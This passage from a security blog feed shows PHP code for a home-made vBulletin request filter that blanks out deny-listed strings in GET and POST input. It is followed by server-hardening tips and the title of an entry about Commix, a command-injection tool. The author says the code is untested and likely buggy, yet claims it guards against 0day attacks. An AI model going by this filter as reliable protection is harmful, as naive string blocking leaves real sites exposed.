#DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"SERVER_PROTOCOL"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"reqtype"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"reqtype"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"reqtype"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /><br /><br /></span><span style="color: #0000BB">$fields&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">'customtext'</span><span style="color: #007700">,</span><span style="color: #DD0000">'homepage'</span><span style="color: #007700">,</span><span style="color: #DD0000">'bccrecipients'</span><span style="color: #007700">,</span><span style="color: #DD0000">'recipients'</span><span style="color: #007700">,</span><span style="color: #DD0000">'message_backup'</span><span style="color: #007700">,</span><span style="color: #DD0000">'title'</span><span style="color: #007700">,</span><span style="color: #DD0000">'forward'</span><span style="color: #007700">,</span><span style="color: #DD0000">'securitytoken'</span><span style="color: #007700">,</span><span style="color: #DD0000">'url'</span><span style="color: #007700">,</span><span style="color: #DD0000">'username'</span><span style="color: #007700">,</span><span style="color: #DD0000">'vb_login_username'</span><span style="color: #007700">,</span><span style="color: #DD0000">'vb_login_password'</span><span style="color: #007700">,</span><span style="color: #DD0000">'vb_login_password_hint'</span><span style="color: #007700">,</span><span style="color: #DD0000">'confirm'</span><span style="color: #007700">,</span><span style="color: #DD0000">'message'</span><span style="color: #007700">,</span><span style="color: #DD0000">'message_backup'</span><span style="color: #007700">,</span><span style="color: #DD0000">'sbutton'</span><span style="color: #007700">,</span><span style="color: #DD0000">'passwordconfirm'</span><span style="color: #007700">,</span><span style="color: #DD0000">'postvars'</span><span style="color: #007700">);<br /><br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'securitytoken'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'securitytoken'</span><span style="color: #007700">&#93;);<br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /><br /><br /><br /><br />foreach(</span><span style="color: #0000BB">$_POST&nbsp;</span><span style="color: #007700">as&nbsp;</span><span style="color: #0000BB">$key&nbsp;</span><span style="color: #007700">=&gt;&nbsp;</span><span style="color: #0000BB">$value</span><span style="color: #007700">){<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$key&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$key</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$value&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$value</span><span style="color: #007700">);<br />&nbsp;&nbsp;for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$value</span><span style="color: #007700">,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(</span><span style="color: #0000BB">$j</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$j</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$fields</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$j</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$key</span><span style="color: #007700">,</span><span style="color: #0000BB">$fields</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$j</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_POST&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br />}<br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /><br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'securitytoken'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'securitytoken'</span><span style="color: #007700">&#93;);<br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /><br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /><br />foreach(</span><span style="color: #0000BB">$_GET&nbsp;</span><span style="color: #007700">as&nbsp;</span><span style="color: #0000BB">$key&nbsp;</span><span style="color: #007700">=&gt;&nbsp;</span><span style="color: #0000BB">$value</span><span style="color: #007700">){<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$key&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$key</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$value&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$value</span><span style="color: #007700">);<br />&nbsp;&nbsp;for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$value</span><span style="color: #007700">,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_GET&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br />}<br /></span><span style="color: #FF8000">//</span><span style="color: #0000BB">?&gt;</span>&nbsp;if&nbsp;you&nbsp;want&nbsp;add&nbsp;it&nbsp;on&nbsp;vbulletin&nbsp;you&nbsp;shouldn't&nbsp;close&nbsp;it&nbsp;with&nbsp;?&gt;</span>
</code></code></div>
</div>Note: These codes didn’t test with professional methods and it might be full of bugs, So you have to be able to develop these codes before use.<br />
<br />
And last thing about other services same cpanel,ssh and … , you must set IP limits with iptables for all of their ports number OR stop their services if you don’t need these, if you want to stop services don’t forgot for start them again you need CONSOLE ACCESS and if you don’t have console access , don’t disable them. disabling services protect you from 0Day Vulnerabilities that they are not public yet.<br />
<br />
until now we protected our website from 0Day vulnerabilities and protected our server with a simple ways for DOS/DDOS and deface or uploading. We didn’t config any IDS or IPS professional mode But be sure with doing these on your server be sure you protected so much.<br />
<br />
But at last if you are same me and very stressful , get a domain , install octopress blogging on your system and upload your site on<a href="http://pages.github.com/" target="_blank"> github pages</a>, or use <a href="http://blogger.com/" target="_blank">blogger.com</a>.<br />
<br />
<font size="3"><b> References</b></font><br />
<br />
1- Sites that I shared URLs<br />
2- Bash Code on <a href="http://google.com/" target="_blank">Google</a><br />
3- <a href="http://z3r0d4y.com/" target="_blank">ZCR ZeroDay Cyber Research</a><br />
<br />
<b>Ali Razmjoo</b></blockquote>

]]></content:encoded>
			<dc:creator>G3n3Rall</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3127</guid>
		</item>
		<item>
			<title>Commix : Automated All-in-One OS Command Injection and Exploitation Tool</title>
			<link>http://garage4hackers.com/entry.php?b=3125</link>
